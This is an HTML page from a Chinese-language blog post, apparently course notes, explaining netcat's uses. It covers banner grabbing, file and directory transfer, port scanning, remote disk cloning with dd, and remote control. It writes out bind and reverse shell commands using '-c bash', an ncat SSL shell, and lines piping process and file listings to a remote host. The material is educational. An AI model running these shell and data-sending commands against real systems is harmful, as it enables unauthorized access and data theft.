@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Nc Wireshark Tcpdump  NC 简介 身材小巧，能力强 侦听模式\传输模式 telent/获取banner信息 传输文本信息 传输文件/目录 加密传输文件 远程控制/木马 加密所有流量 流媒体服务器 远程克隆硬盘 NC——TELNET/BANNER nc -nv 1.1.1.1 110  nc -nv 1.1.1.1 25  nc -nv 1.1.1.1 80  nc -h 查">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NETCAT">
+<meta property="og:url" content="http://yoursite.com/2018/01/29/Netcat/index.html">
+<meta property="og:site_name" content="Chace Blog">
+<meta property="og:description" content="Nc Wireshark Tcpdump  NC 简介 身材小巧，能力强 侦听模式\传输模式 telent/获取banner信息 传输文本信息 传输文件/目录 加密传输文件 远程控制/木马 加密所有流量 流媒体服务器 远程克隆硬盘 NC——TELNET/BANNER nc -nv 1.1.1.1 110  nc -nv 1.1.1.1 25  nc -nv 1.1.1.1 80  nc -h 查">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-01-29T08:01:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="NETCAT">
+<meta name="twitter:description" content="Nc Wireshark Tcpdump  NC 简介 身材小巧，能力强 侦听模式\传输模式 telent/获取banner信息 传输文本信息 传输文件/目录 加密传输文件 远程控制/木马 加密所有流量 流媒体服务器 远程克隆硬盘 NC——TELNET/BANNER nc -nv 1.1.1.1 110  nc -nv 1.1.1.1 25  nc -nv 1.1.1.1 80  nc -h 查">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>NETCAT</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/01/29/网络数据包分析工具/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/01/28/基础扫描/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/01/29/Netcat/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/01/29/Netcat/&text=NETCAT"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/01/29/Netcat/&title=NETCAT"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/01/29/Netcat/&is_video=false&description=NETCAT"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NETCAT&body=Check out this article: http://yoursite.com/2018/01/29/Netcat/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/01/29/Netcat/&title=NETCAT"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/01/29/Netcat/&title=NETCAT"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/01/29/Netcat/&title=NETCAT"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/01/29/Netcat/&title=NETCAT"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/01/29/Netcat/&name=NETCAT&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#NC-简介"><span class="toc-number">1.</span> <span class="toc-text">NC 简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC——TELNET-BANNER"><span class="toc-number">2.</span> <span class="toc-text">NC——TELNET/BANNER</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC——-传输文本信息"><span class="toc-number">3.</span> <span class="toc-text">NC—— 传输文本信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC——传输文件、目录"><span class="toc-number">4.</span> <span class="toc-text">NC——传输文件、目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC——流媒体服务器"><span class="toc-number">5.</span> <span class="toc-text">NC——流媒体服务器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC——端口扫描"><span class="toc-number">6.</span> <span class="toc-text">NC——端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC——-远程克隆硬盘"><span class="toc-number">7.</span> <span class="toc-text">NC—— 远程克隆硬盘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC——远程控制"><span class="toc-number">8.</span> <span class="toc-text">NC——远程控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC-缺点"><span class="toc-number">9.</span> <span class="toc-text">NC 缺点</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        NETCAT
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Chace Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-01-29T03:45:02.000Z" itemprop="datePublished">2018-01-29</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <ul>
+<li>Nc</li>
+<li>Wireshark</li>
+<li>Tcpdump</li>
+</ul>
+<h4 id="NC-简介"><a href="#NC-简介" class="headerlink" title="NC 简介"></a>NC 简介</h4><ul>
+<li>身材小巧，能力强</li>
+<li>侦听模式\传输模式</li>
+<li>telent/获取banner信息</li>
+<li>传输文本信息</li>
+<li>传输文件/目录</li>
+<li>加密传输文件</li>
+<li>远程控制/木马</li>
+<li>加密所有流量</li>
+<li>流媒体服务器</li>
+<li><p>远程克隆硬盘</p>
+<h4 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET/BANNER"></a>NC——TELNET/BANNER</h4></li>
+<li><p><code>nc -nv 1.1.1.1 110</code></p>
+</li>
+<li><p><code>nc -nv 1.1.1.1 25</code></p>
+</li>
+<li><p><code>nc -nv 1.1.1.1 80</code></p>
+</li>
+<li><p><code>nc -h</code> 查询参数使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[v1.10-41.1]</span><br><span class="line">connect to somewhere:	nc [-options] hostname port[s] [ports] ... </span><br><span class="line">listen for inbound:	nc -l -p port [-options] [hostname] [port]</span><br><span class="line">options:</span><br><span class="line">	-c shell commands	as `-e&apos;; use /bin/sh to exec [dangerous!!]</span><br><span class="line">	-e filename		program to exec after connect [dangerous!!]</span><br><span class="line">	-b			allow broadcasts</span><br><span class="line">	-g gateway		source-routing hop point[s], up to 8</span><br><span class="line">	-G num			source-routing pointer: 4, 8, 12, ...</span><br><span class="line">	-h			this cruft</span><br><span class="line">	-i secs			delay interval for lines sent, ports scanned</span><br><span class="line">        -k                      set keepalive option on socket</span><br><span class="line">	-l			listen mode, for inbound connects</span><br><span class="line">	-n			numeric-only IP addresses, no DNS</span><br><span class="line">	-o file			hex dump of traffic</span><br><span class="line">	-p port			local port number</span><br><span class="line">	-r			randomize local and remote ports</span><br><span class="line">	-q secs			quit after EOF on stdin and delay of secs</span><br><span class="line">	-s addr			local source address</span><br><span class="line">	-T tos			set Type Of Service</span><br><span class="line">	-t			answer TELNET negotiation</span><br><span class="line">	-u			UDP mode</span><br><span class="line">	-v			verbose [use twice to be more verbose]</span><br><span class="line">	-w secs			timeout for connects and final net reads</span><br><span class="line">	-C			Send CRLF as line-ending</span><br><span class="line">	-z			zero-I/O mode [used for scanning]</span><br><span class="line">port numbers can be individual or ranges: lo-hi [inclusive];</span><br><span class="line">hyphens in port names must be backslash escaped (e.g. &apos;ftp\-data&apos;).</span><br></pre></td></tr></table></figure>
+<p><code>-v</code> 显示详细连接信息</p>
+<p><code>n</code> 不做DNS解析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ping pop3.163.com</span><br><span class="line">nc -vn 220.181.12.110 110</span><br><span class="line">(UNKNOWN) [220.181.12.110] 110 (pop3) open</span><br><span class="line">+OK Welcome to coremail Mail Pop3 Server (163coms[b62aaa251425b4be4eaec4ab4744cf47s])</span><br></pre></td></tr></table></figure>
+<p><code>base64</code></p>
+<p><code>邮箱地址</code></p>
+<p>Ctrl+D</p>
+<p><code>USER base64地址</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ping smtp.163.com</span><br><span class="line">nc -vn 220.181.12.16</span><br><span class="line">ehlo 用户名</span><br><span class="line">AUTH LOGIN  不用BASE64</span><br></pre></td></tr></table></figure>
+<p>​</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -vn 10.10.10.129 80</span><br><span class="line">get </span><br><span class="line">head</span><br></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+</ul>
+<h4 id="NC——-传输文本信息"><a href="#NC——-传输文本信息" class="headerlink" title="NC—— 传输文本信息"></a>NC—— 传输文本信息</h4><p>开了两台虚拟机</p>
+<p>A:nc -l -p 4444</p>
+<p>打开侦听端口</p>
+<p>B:nc -nv 1.1.1.1 4444</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 333</span><br><span class="line">netstat -pantu | grep 333 查看端口是否开启</span><br><span class="line">另一台机器</span><br><span class="line">nc -nv 10.10.10.133 333</span><br></pre></td></tr></table></figure>
+<p>远程信息收集</p>
+<p><code>ls -l | nc -nv 10.10.10.133</code></p>
+<p>可以在远端电脑上</p>
+<p><code>nc -l -p 333 &gt; 1.txt</code></p>
+<p>需要审计电脑</p>
+<p><code>ps aux | nc -nv 10.10.10.133 -q 1</code></p>
+<p>-q 命令执行完成 1秒自动断开连接 表明任务完成</p>
+<p><code>lsof | nc -nv 10.10.10.133 -q 1</code></p>
+<h4 id="NC——传输文件、目录"><a href="#NC——传输文件、目录" class="headerlink" title="NC——传输文件、目录"></a>NC——传输文件、目录</h4><ul>
+<li><p>传输文件</p>
+<ul>
+<li>A： <code>nc -lp 333 &gt; 1.mp4</code></li>
+<li>B: <code>nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1</code></li>
+<li>或</li>
+<li>A:<code>nc -q 1 -lp 333 &lt; a.mp4</code></li>
+<li>B:<code>nc -nv 1.1.1.1 333 &gt; 2.mp4</code></li>
+</ul>
+</li>
+<li><p>传输目录</p>
+<ul>
+<li><p>A：<code>tar -cvf - music | nc -lp 333 -q 1</code></p>
+<p>先打包 再传输 </p>
+</li>
+<li><p>B: <code>nc -nv 1.1.1.1 333 | tar -xvf -</code></p>
+</li>
+</ul>
+</li>
+<li><p>加密传文件</p>
+<ul>
+<li>A：<code>nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</code></li>
+<li>B: <code>mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4| nc -nv 1.1.1.1 333 -q 1</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="NC——流媒体服务器"><a href="#NC——流媒体服务器" class="headerlink" title="NC——流媒体服务器"></a>NC——流媒体服务器</h4><ul>
+<li>A: <code>cat 1.mp4 | nc -lp 333</code></li>
+<li>B : <code>nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</code></li>
+</ul>
+<h4 id="NC——端口扫描"><a href="#NC——端口扫描" class="headerlink" title="NC——端口扫描"></a>NC——端口扫描</h4><p><code>nc -nvz 1.1.1.1 1-65535</code> tcp端口</p>
+<p><code>nc -vnzu 1.1.1.1 1-1024</code> udp端口</p>
+<h4 id="NC——-远程克隆硬盘"><a href="#NC——-远程克隆硬盘" class="headerlink" title="NC—— 远程克隆硬盘"></a>NC—— 远程克隆硬盘</h4><ul>
+<li><p>A: <code>nc -lp 333 | dd of=/dev/sda</code></p>
+</li>
+<li><p>B: <code>dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></p>
+<p>远程电子取证，可以将目标服务器硬盘远程复制</p>
+</li>
+</ul>
+<h4 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h4><ul>
+<li><p>正向</p>
+<ul>
+<li>A:<code>nc -lp 333 -c bash</code></li>
+<li>B:<code>nc 1.1.1.1 333</code></li>
+</ul>
+</li>
+<li><p>反向</p>
+<ul>
+<li>A: <code>nc -lp 333</code></li>
+<li>B: <code>nc 1.1.1.1 333 -c bash</code></li>
+</ul>
+<p>windows用户把bash改成cmd </p>
+</li>
+</ul>
+<h4 id="NC-缺点"><a href="#NC-缺点" class="headerlink" title="NC 缺点"></a>NC 缺点</h4><ul>
+<li>Nc缺乏加密和身份验证的能力</li>
+<li>Ncat包含于nmap工具包中</li>
+</ul>
+<p>A： <code>ncat -c bash --alllow 192.168.20.14 -vnl 333 --ssl</code></p>
+<p>B:<code>ncat -nv 192.168.1.115 333 --ssl</code></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#NC-简介"><span class="toc-number">1.</span> <span class="toc-text">NC 简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC——TELNET-BANNER"><span class="toc-number">2.</span> <span class="toc-text">NC——TELNET/BANNER</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC——-传输文本信息"><span class="toc-number">3.</span> <span class="toc-text">NC—— 传输文本信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC——传输文件、目录"><span class="toc-number">4.</span> <span class="toc-text">NC——传输文件、目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC——流媒体服务器"><span class="toc-number">5.</span> <span class="toc-text">NC——流媒体服务器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC——端口扫描"><span class="toc-number">6.</span> <span class="toc-text">NC——端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC——-远程克隆硬盘"><span class="toc-number">7.</span> <span class="toc-text">NC—— 远程克隆硬盘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC——远程控制"><span class="toc-number">8.</span> <span class="toc-text">NC——远程控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC-缺点"><span class="toc-number">9.</span> <span class="toc-text">NC 缺点</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/01/29/Netcat/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/01/29/Netcat/&text=NETCAT"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/01/29/Netcat/&title=NETCAT"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/01/29/Netcat/&is_video=false&description=NETCAT"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NETCAT&body=Check out this article: http://yoursite.com/2018/01/29/Netcat/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/01/29/Netcat/&title=NETCAT"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/01/29/Netcat/&title=NETCAT"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/01/29/Netcat/&title=NETCAT"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/01/29/Netcat/&title=NETCAT"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/01/29/Netcat/&name=NETCAT&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 jsmhny
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
